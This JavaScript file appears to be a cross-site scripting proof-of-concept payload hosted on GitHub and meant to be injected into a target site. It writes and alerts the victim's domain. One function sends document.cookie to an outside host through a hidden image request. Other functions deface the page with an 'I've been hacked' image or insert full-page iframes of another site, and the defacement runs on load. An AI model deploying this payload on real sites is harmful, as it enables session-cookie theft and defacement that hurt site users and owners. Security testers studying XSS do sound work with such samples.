document.write ("This js is located at han's github, and your doamin is : " + document.domain);
alert ("This js is located at han's github, and your doamin is : " + document.domain);

function img_trans(){
	var image_trans = document.createElement("img");
	image_trans.setAttribute("style", "display: none");
	image_trans.setAttribute("src", "https://www.google.com/search?q=" + document.cookie);
	document.body.appendChild(image_trans);
}
function img_show(){
	var image_show = document.createElement("img");
	image_show.setAttribute("src", "https://i1.wp.com/www.newyorkcomputerhelp.com/wp-content/uploads/2016/02/ive-been-hacked-help.png?zoom=2.625&resize=214%2C250&ssl=1");
	document.body.appendChild(image_show);
}
function img_show_top(){
	var image_show = document.createElement("img");
	image_show.setAttribute("src", "https://i1.wp.com/www.newyorkcomputerhelp.com/wp-content/uploads/2016/02/ive-been-hacked-help.png?zoom=2.625&resize=214%2C250&ssl=1");
	var body = document.getElementsByTagName("body")[0];
	body.insertBefore(image_show, body.firstChild);
}
function ifrm(){
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("src", "https://www.ptt.cc/bbs");
	ifrm.style.width = "100%";
	ifrm.style.height = "1024px";
	document.body.appendChild(ifrm);
}
function ifrm_top(){
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("src", "https://www.ptt.cc/bbs");
	ifrm.style.width = "100%";
	ifrm.style.height = "1024px";
	var body = document.getElementsByTagName("body")[0];
	body.insertBefore(ifrm, body.firstChild);
}

img_show_top();
